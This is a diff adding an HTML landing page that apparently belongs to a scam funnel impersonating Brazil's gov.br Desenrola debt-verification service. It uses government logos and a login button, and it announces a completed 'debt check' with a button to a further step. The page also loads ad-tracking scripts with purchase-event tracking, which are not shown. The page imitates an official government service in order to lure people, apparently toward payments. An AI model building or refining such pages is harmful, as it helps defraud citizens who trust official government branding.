@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <!-- Utmify: captura de UTMs + pixel (ver desen/js/utmify-tracking.js) -->
+  <script src="/desen/js/utmify-tracking.js"></script>
+  <!-- Pixel da Meta nativo + eventos Purchase/IC (ver desen/js/meta-pixel.js) -->
+  <script src="/desen/js/meta-pixel.js"></script>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <link rel="icon" type="image/png" sizes="96x96" href="images/icons8-brasil-windows-11-color-96.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="images/icons8-brasil-windows-11-color-32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="images/icons8-brasil-windows-11-color-16.png">
+  <title>Verificação de Débitos — Resultado</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="css/desenrola.css">
+  <style>
+  </style>
+</head>
+<body>
+  <div class="page-wrap">
+    <header class="hdr">
+      <a href="../index.html" class="hdr-logo-link" aria-label="gov.br">
+        <img src="images/iconegov.png" alt="" class="hdr-logo-img" width="100" height="32">
+      </a>
+      <div class="hdr-right">
+        <button type="button" class="hdr-icon-btn" id="hdrMenu" aria-label="Abrir menu" aria-expanded="false">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.35" stroke-linecap="round" aria-hidden="true">
+            <line x1="4" y1="7" x2="20" y2="7"></line>
+            <line x1="4" y1="12" x2="20" y2="12"></line>
+            <line x1="4" y1="17" x2="20" y2="17"></line>
+          </svg>
+        </button>
+        <span class="hdr-vsep" aria-hidden="true"></span>
+        <button type="button" class="hdr-icon-btn hdr-icon-btn--contrast" id="hdrContrast" aria-label="Alto contraste" title="Contraste">
+          <svg class="hdr-ico-split-contrast" width="22" height="22" viewBox="0 0 24 24" aria-hidden="true">
+            <circle cx="12" cy="12" r="9.25" fill="none" stroke="#1451B4" stroke-width="1.15"></circle>
+            <path fill="#1451B4" d="M12 2.75 A9.25 9.25 0 0 0 12 21.25 z"></path>
+            <path fill="#ffffff" d="M12 2.75 A9.25 9.25 0 0 1 12 21.25 z"></path>
+          </svg>
+        </button>
+        <button type="button" class="btn-entrar" aria-label="Entrar">
+          <svg width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+            <path fill="currentColor" d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"></path>
+          </svg>
+          Entrar
+        </button>
+      </div>
+    </header>
+
+    <div class="crumb">
+      Benefício <span aria-hidden="true"> &gt; </span> Verificação de Débitos
+    </div>
+
+    <div class="hero-banner">
+      <img class="hero-img" src="images/fundo.png" alt="" width="720" height="360">
+    </div>
+
+    <section class="card-main landing">
+      <div class="stack-logo stack-logo-single">
+        <img class="ico" src="images/logoamarelo.png" alt="">
+        <img class="titulo-img" src="images/desenrola.png" alt="Verificação de Débitos">
+      </div>
+
+      <p class="headline">
+        Sua verificação foi<br>
+        realizada com sucesso!<br>
+        Confira os resultados
+      </p>
+      <p class="subline">
+        Clique no botão abaixo para<br>
+        acessar os detalhes
+      </p>
+
+      <a id="btnAcessar" class="btn-primary btn-cta-pill" href="../../desen/log/index.html">Acessar detalhes</a>
+    </section>
+
+    <footer class="site-ft">
+      <div class="site-ft-inner">
+        <img src="images/iconefooter.png" alt="" class="ft-gov-img" width="120" height="40">
+        <div class="copy-block">
+          <p>Todo o conteúdo deste site está publicado sob a licença</p>
+          <strong>Sistema de Verificação — Todos os direitos reservados</strong>
+        </div>
+      </div>
+    </footer>
+  </div>
+
+  <script src="js/header.js"></script>
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      var a = document.getElementById('btnAcessar');
+      if (!a || typeof window.gvdesenrolaAppendQuery !== 'function') return;
+      a.href = window.gvdesenrolaAppendQuery(a.getAttribute('href'));
+    });
+  </script>
+
+</body>
+</html>
